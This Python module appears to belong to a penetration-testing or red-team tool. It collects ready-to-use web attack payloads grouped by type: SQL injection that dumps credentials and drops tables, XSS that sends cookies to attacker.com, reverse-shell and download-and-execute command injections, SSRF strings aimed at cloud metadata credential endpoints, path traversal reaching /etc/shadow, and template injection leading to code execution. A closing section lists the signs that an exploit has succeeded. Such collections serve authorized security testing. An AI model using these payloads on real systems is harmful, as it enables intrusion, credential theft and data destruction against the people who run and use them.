"""
Tier 1 Web Attack Payloads Module

This module contains comprehensive, classic web attack payloads organized by attack type.
Designed for security testing and red team operations. All payloads are well-documented
and grouped by attack vector and database/framework type.

Warning: Use only for authorized security testing and penetration testing engagements.
"""

SQL_INJECTION = {
    """
    SQL Injection payloads across multiple database systems.
    Covers union-based, blind boolean, time-based, error-based, and stacked queries.
    """
    "union_based": {
        """Union SELECT injection for extracting data from databases."""
        "mysql": [
            "' UNION SELECT NULL,NULL,NULL,NULL-- -",
            "' UNION SELECT 1,2,3,4-- -",
            "' UNION SELECT user(),database(),version(),NULL-- -",
            "' UNION SELECT table_name,column_name,data_type,NULL FROM information_schema.columns-- -",
            "' UNION SELECT CONCAT(user,':',password),3,4,5 FROM mysql.user-- -",
            "1' UNION ALL SELECT NULL,CONCAT(0x3a3a3a,user(),0x3a3a3a),NULL,NULL-- -",
        ],
        "postgresql": [
            "' UNION SELECT NULL,NULL,NULL,NULL-- -",
            "' UNION SELECT 1,2,3,4-- -",
            "' UNION SELECT user,database(),version(),NULL-- -",
            "' UNION SELECT table_name,column_name,data_type,NULL FROM information_schema.columns-- -",
            "' UNION SELECT usename,passwd,usesuper,usecreatedb FROM pg_shadow-- -",
            "1' UNION ALL SELECT NULL,CONCAT(':::',current_user,':::'),NULL,NULL-- -",
        ],
        "mssql": [
            "' UNION SELECT NULL,NULL,NULL,NULL-- -",
            "' UNION SELECT 1,2,3,4-- -",
            "' UNION SELECT user,db_name(),@@version,NULL-- -",
            "' UNION SELECT table_name,column_name,data_type,NULL FROM information_schema.columns-- -",
            "' UNION SELECT name,password_hash,type,NULL FROM sys.sql_logins-- -",
        ],
        "sqlite": [
            "' UNION SELECT NULL,NULL,NULL,NULL-- -",
            "' UNION SELECT 1,2,3,4-- -",
            "' UNION SELECT sqlite_version(),NULL,NULL,NULL-- -",
            "' UNION SELECT name,sql,type,NULL FROM sqlite_master WHERE type='table'-- -",
        ],
    },
    "blind_boolean": {
        """Boolean-based blind SQL injection for confirming conditions."""
        "basic_patterns": [
            "' AND 1=1-- -",
            "' AND 1=2-- -",
            "' OR 1=1-- -",
            "' OR 1=2-- -",
        ],
        "authentication_bypass": [
            "' OR '1'='1",
            "' OR ''='",
            "admin' OR '1'='1",
            "admin' OR 1=1-- -",
            "' UNION SELECT NULL WHERE 1=1-- -",
        ],
        "condition_testing": [
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
            "' AND (SELECT LENGTH(user()))>0-- -",
            "' AND SUBSTRING(database(),1,1)='a'-- -",
            "' AND SUBSTRING(user(),1,1)='r'-- -",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64-- -",
        ],
        "existence_probing": [
            "' AND EXISTS(SELECT 1 FROM information_schema.tables)-- -",
            "' AND EXISTS(SELECT 1 FROM mysql.user)-- -",
            "' AND EXISTS(SELECT 1 FROM pg_tables)-- -",
        ],
    },
    "blind_time": {
        """Time-based blind SQL injection using database delay functions."""
        "mysql": [
            "' AND SLEEP(5)-- -",
            "' UNION SELECT SLEEP(5)-- -",
            "' AND IF(1=1,SLEEP(5),0)-- -",
            "' AND IF(SUBSTRING(database(),1,1)='m',SLEEP(5),0)-- -",
            "' UNION SELECT SLEEP(IF(1=1,5,0))-- -",
            "' UNION SELECT BENCHMARK(5000000,MD5('a'))-- -",
        ],
        "postgresql": [
            "' AND pg_sleep(5)-- -",
            "' UNION SELECT pg_sleep(5)-- -",
            "' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
            "' AND CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END-- -",
        ],
        "mssql": [
            "' WAITFOR DELAY '00:00:05'-- -",
            "' IF (1=1) WAITFOR DELAY '00:00:05'-- -",
            "' IF (SUBSTRING(user(),1,1)='s') WAITFOR DELAY '00:00:05'-- -",
            "' UNION SELECT WAITFOR DELAY '00:00:05'-- -",
        ],
        "oracle": [
            "' AND DBMS_LOCK.sleep(5)-- -",
            "' AND CASE WHEN (1=1) THEN DBMS_LOCK.sleep(5) ELSE DBMS_LOCK.sleep(0) END-- -",
        ],
    },
    "error_based": {
        """Error-based SQL injection extracting data through error messages."""
        "mysql_extractvalue": [
            "' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
            "' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -",
            "' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))-- -",
            "' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(user,':',password) FROM mysql.user LIMIT 1)))-- -",
        ],
        "mysql_updatexml": [
            "' AND updatexml(1,concat(0x7e,(SELECT user())),1)-- -",
            "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
            "' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -",
        ],
        "mysql_convert": [
            "' AND CONVERT(int,(SELECT @@version))-- -",
            "' UNION SELECT CAST(CONCAT('Error:',user()) AS INT)-- -",
        ],
        "postgresql_cast": [
            "' AND CAST(1 AS INT WHERE 1=(SELECT 1))-- -",
            "' AND CAST(CONCAT('Error:',current_user) AS INT)-- -",
        ],
    },
    "stacked_queries": {
        """Multiple statement injection for systems supporting stacked queries."""
        "mysql": [
            "'; DROP TABLE users-- -",
            "'; INSERT INTO users (username,password) VALUES ('hacker','pwd')-- -",
            "'; UPDATE users SET password='hacked' WHERE 1=1-- -",
            "'; EXEC sp_executesql-- -",
        ],
        "mssql": [
            "'; DROP TABLE users-- -",
            "'; INSERT INTO users VALUES ('hacker','pwd')-- -",
            "'; EXEC xp_cmdshell 'whoami'-- -",
            "'; sp_adduser 'hacker'-- -",
        ],
        "postgresql": [
            "'; DROP TABLE users; --",
            "'; CREATE USER hacker WITH PASSWORD 'pwd';-- -",
            "'; INSERT INTO users VALUES ('hacker','pwd');-- -",
        ],
    },
}

CROSS_SITE_SCRIPTING = {
    """
    Cross-Site Scripting (XSS) payloads covering reflected, DOM-based, 
    stored XSS, and filter bypass techniques.
    """
    "reflected": {
        """Reflected XSS payloads executed immediately."""
        "basic_scripts": [
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            "<script>fetch('http://attacker.com?c='+document.cookie)</script>",
            "<script src='http://attacker.com/evil.js'></script>",
        ],
        "img_onerror": [
            "<img src=x onerror='alert(1)'>",
            "<img src=x onerror='fetch(\"http://attacker.com?c=\"+document.cookie)'>",
            "<img src=x onerror='new Image().src=\"http://attacker.com/log?c=\"+document.cookie'>",
        ],
        "svg_onload": [
            "<svg onload='alert(1)'>",
            "<svg onload='fetch(\"http://attacker.com?c=\"+document.cookie)'>",
            "<svg/onload='alert(String.fromCharCode(88,83,83))'>",
        ],
        "event_handlers": [
            "<body onload='alert(1)'>",
            "<input onfocus='alert(1)' autofocus>",
            "<select onfocus='alert(1)' autofocus>",
            "<textarea onfocus='alert(1)' autofocus>",
            "<iframe onload='alert(1)'>",
            "<marquee onstart='alert(1)'>",
        ],
        "form_submission": [
            "<form action='http://attacker.com'><input name='c' value=''></form>",
            "<form><input onfocus='alert(1)' autofocus></form>",
        ],
    },
    "dom_based": {
        """DOM-based XSS exploiting client-side JavaScript."""
        "location_manipulation": [
            "javascript:alert(document.cookie)",
            "javascript:fetch('http://attacker.com?c='+document.cookie)",
        ],
        "innerhtml_injection": [
            "<img id=x src=x onerror='document.getElementById(\"target\").innerHTML=\"<script>alert(1)</script>\"'>",
            "'; document.body.innerHTML='<img src=x onerror=alert(1)>';'",
        ],
        "eval_based": [
            "<img src=x onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
            "<img src=x onerror='window[\"eval\"](\"alert(1)\")'>",
        ],
        "setter_gadgets": [
            "<img src=x onerror='Object.defineProperty(window,\"x\",{get:()=>alert(1)})'>",
        ],
    },
    "stored": {
        """Persistent XSS via data storage (databases, comments, etc)."""
        "comment_injection": [
            "<script>alert('Stored XSS')</script>",
            "<img src=x onerror='fetch(\"http://attacker.com\")'>",
        ],
        "profile_field_injection": [
            "Username: <script>alert(1)</script>",
            "Bio: <img src=x onerror='alert(document.cookie)'>",
        ],
        "blog_post_injection": [
            "Title: <svg onload='alert(1)'>",
            "Content: <iframe src='javascript:alert(1)'></iframe>",
        ],
    },
    "filter_bypass": {
        """Techniques to bypass XSS filters and WAF protections."""
        "encoding_tricks": [
            "<img src=x onerror='eval(String.fromCharCode(97,108,101,114,116,40,49,41))'>",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e",
        ],
        "tag_nesting": [
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<s<script>cript>alert(1)</s</script>cript>",
        ],
        "attribute_injection": [
            "<svg onload=alert(1) />",
            "<img src=x on error=alert(1)>",
            "<img src=x onerror='alert&#40;1&#41;'>",
        ],
        "case_variation": [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=X ONERROR=alert(1)>",
        ],
        "null_byte_injection": [
            "<script>alert%00(1)</script>",
            "<img src=x onerror%00='alert(1)'>",
        ],
        "protocol_handlers": [
            "<a href='javascript:alert(1)'>click</a>",
            "<form action='javascript:alert(1)'></form>",
        ],
    },
}

COMMAND_INJECTION = {
    """
    Operating system command injection payloads for Linux and Windows systems.
    Includes various separator and encoding techniques.
    """
    "linux": {
        """Linux/Unix command injection techniques."""
        "separators": [
            "; ls -la",
            "| whoami",
            "|| id",
            "&& cat /etc/passwd",
            "$(whoami)",
            "`cat /etc/shadow`",
            "\n whoami",
            "\r whoami",
        ],
        "command_chaining": [
            "; curl http://attacker.com/shell.sh | bash",
            "| nc attacker.com 4444 -e /bin/bash",
            "| python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'",
        ],
        "file_operations": [
            "; cat /etc/passwd",
            "; cat /etc/shadow",
            "; cat ~/.ssh/id_rsa",
            "; ls -la /home",
        ],
        "reverse_shell": [
            "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
            "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f",
        ],
    },
    "windows": {
        """Windows command injection techniques."""
        "separators": [
            "& whoami",
            "| ipconfig",
            "&& systeminfo",
            "|| dir",
            "\n whoami",
            "\r whoami",
        ],
        "cmd_execution": [
            "& cmd /c whoami",
            "| cmd /c dir C:\\",
            "&& cmd /c ipconfig /all",
        ],
        "powershell_execution": [
            "& powershell whoami",
            "| powershell -Command 'Get-Process'",
            "&& powershell -Command 'IEX(New-Object Net.WebClient).DownloadString(\"http://attacker.com/evil.ps1\")'",
        ],
        "file_operations": [
            "& type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| dir C:\\Users",
            "&& type C:\\Windows\\win.ini",
        ],
        "scheduled_task": [
            "& schtasks /create /tn evil /tr 'powershell -Command ...' /sc once",
        ],
    },
    "encoding": {
        """Encoded command injection payloads."""
        "url_encoded": [
            "%3B%20whoami",
            "%7C%20id",
            "%26%26%20cat%20%2Fetc%2Fpasswd",
        ],
        "hex_encoded": [
            "$(echo -n 'id' | xxd -r -p)",
            "$(printf '%s' 0x2f6574632f70617373776421 | xxd -r)",
        ],
        "base64_encoded": [
            "$(echo 'id' | base64 -d)",
            "bash -c 'echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash'",
        ],
    },
}

SSRF = {
    """
    Server-Side Request Forgery (SSRF) payloads targeting internal resources,
    cloud metadata services, and various protocol handlers.
    """
    "internal_network": {
        """Targeting internal network resources."""
        "localhost": [
            "http://127.0.0.1:8080",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:27017",
        ],
        "link_local": [
            "http://169.254.169.254/",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/computeMetadata/v1/",
        ],
        "private_ranges": [
            "http://10.0.0.1",
            "http://10.0.0.0/24",
            "http://192.168.0.1",
            "http://192.168.1.1",
            "http://172.16.0.0/12",
        ],
        "admin_interfaces": [
            "http://127.0.0.1:8080/admin",
            "http://127.0.0.1:9000/status",
            "http://localhost:8081/management",
        ],
    },
    "cloud_metadata": {
        """Cloud provider metadata endpoints."""
        "aws": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/meta-data/instance-id",
            "http://169.254.169.254/latest/meta-data/iam/info",
        ],
        "gcp": [
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity",
            "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=http://metadata.google.internal",
        ],
        "azure": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "alibaba": [
            "http://100.100.100.200/latest/meta-data/",
        ],
    },
    "protocol_handlers": {
        """Alternative protocol handlers for SSRF."""
        "file_protocol": [
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///proc/self/environ",
            "file:///var/www/html/config.php",
        ],
        "gopher_protocol": [
            "gopher://127.0.0.1:25/_MAIL%20FROM:<attacker@attacker.com>%0d%0aRCPT%20TO:<victim@example.com>%0d%0a",
        ],
        "dict_protocol": [
            "dict://127.0.0.1:6379/info",
            "dict://127.0.0.1:27017/",
        ],
        "ftp_protocol": [
            "ftp://127.0.0.1:21/",
            "ftp://anonymous:password@127.0.0.1:21/",
        ],
        "ldap_protocol": [
            "ldap://127.0.0.1:389/",
        ],
    },
}

PATH_TRAVERSAL = {
    """
    Path traversal (directory traversal) payloads for reading arbitrary files.
    Includes various encoding and bypass techniques.
    """
    "basic_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "....//....//....//etc/passwd",
        "..;/..;/..;/etc/passwd",
    ],
    "url_encoded": [
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    ],
    "double_encoded": [
        "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
        "%25252e%25252e%25252fetc%25252fpasswd",
    ],
    "unicode_encoded": [
        "..%c0%afetc%c0%afpasswd",
        "..%c1%9cetc%c1%9cpasswd",
    ],
    "backslash_variations": [
        "..\\\\..\\\\..\\\\windows\\\\win.ini",
        "..\\\\windows\\\\win.ini",
    ],
    "null_byte": [
        "../../../etc/passwd%00.txt",
        "..\\..\\..\\windows\\win.ini%00.jpg",
    ],
    "case_variation": [
        "../../../ETC/PASSWD",
        "..\\..\\..\\Windows\\Win.INI",
    ],
    "target_files": [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../proc/self/environ",
        "../../../../var/log/apache2/access.log",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "..\\..\\..\\boot.ini",
        "..\\..\\..\\windows\\win.ini",
    ],
}

TEMPLATE_INJECTION = {
    """
    Server-Side Template Injection (SSTI) payloads for various
    template engines (Jinja2, Django, ERB, Twig, Freemarker, etc).
    """
    "jinja2": [
        "{{ 7 * 7 }}",
        "{{ config.items() }}",
        "{{ self }}",
        "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        "{% for c in [].__class__.__base__.__subclasses__() %}{% if 'Popen' in c.__name__ %}{{c('id',shell=True,stdout=-1).communicate()}}{% endif %}{% endfor %}",
    ],
    "django": [
        "{{ 7 * 7 }}",
        "{{ settings.SECRET_KEY }}",
        "{{ request.environ }}",
        "{% load __builtin__ %}{{ __builtins__.dir }}",
    ],
    "erb": [
        "<%= 7 * 7 %>",
        "<%= system('id') %>",
        "<%= `whoami` %>",
    ],
    "twig": [
        "{{ 7 * 7 }}",
        "{{ _self }}",
        "{{ _self.env }}",
        "{{ _self.env.registerUndefinedFilterCallback(\"exec\") }}",
    ],
    "freemarker": [
        "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        "[#assign ex=\"freemarker.template.utility.ObjectConstructor\"?new()]${ ex(\"java.lang.ProcessBuilder\",\"id\").start() }",
    ],
    "velocity": [
        "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))$rt.getRuntime().exec('id')",
    ],
}

WEB_SUCCESS_INDICATORS = {
    """
    Detection patterns and success indicators for each attack type.
    Used for validating successful exploitation.
    """
    "sql_injection": {
        """Indicators of successful SQL injection."""
        "error_patterns": [
            "SQL syntax error",
            "Warning: mysql_fetch",
            "You have an error in your SQL syntax",
            "PostgreSQL query failed",
            "ORA-",
            "Microsoft SQL Server error",
            "SQLServer JDBC Driver",
            "SQLite error",
        ],
        "data_extraction": [
            "1=1",
            "1=2",
            "username",
            "password",
            "admin",
        ],
        "timing_indicators": {
            "response_time_delta": 5000,
            "baseline_response_time": 200,
        },
    },
    "xss": {
        """Indicators of successful XSS exploitation."""
        "reflected_indicators": [
            "<script>alert",
            "onerror=",
            "onload=",
            "javascript:",
        ],
        "dom_indicators": [
            "document.cookie",
            "innerHTML",
            "eval(",
        ],
        "stored_indicators": [
            "persisted script tag in response",
            "payload in page source after reload",
        ],
    },
    "command_injection": {
        """Indicators of successful command injection."""
        "linux_indicators": [
            "uid=",
            "gid=",
            "groups=",
            "root",
            "/bin/bash",
        ],
        "windows_indicators": [
            "C:\\\\",
            "Windows",
            "System32",
            "Administrator",
        ],
        "universal_indicators": [
            "total",
            "drwx",
            "Volume",
            "Directory of",
        ],
    },
    "ssrf": {
        """Indicators of successful SSRF exploitation."""
        "aws_metadata": [
            "ami-",
            "AKIA",
            "aws_access_key_id",
            "aws_secret_access_key",
        ],
        "internal_service": [
            "Unauthorized",
            "200 OK",
            "admin panel",
            "internal",
        ],
        "file_access": [
            "root:x:0:0",
            "localhost",
            "127.0.0.1",
        ],
    },
    "path_traversal": {
        """Indicators of successful path traversal."""
        "file_content": [
            "root:x:0:0",
            "[boot loader]",
            "hosts file",
            "etc/passwd content",
        ],
        "error_indicators": [
            "No such file",
            "Permission denied",
            "File not found",
        ],
    },
    "template_injection": {
        """Indicators of successful template injection."""
        "expression_evaluation": [
            "49",
            "7 * 7",
        ],
        "code_execution": [
            "command output",
            "system information",
            "file content",
        ],
    },
}
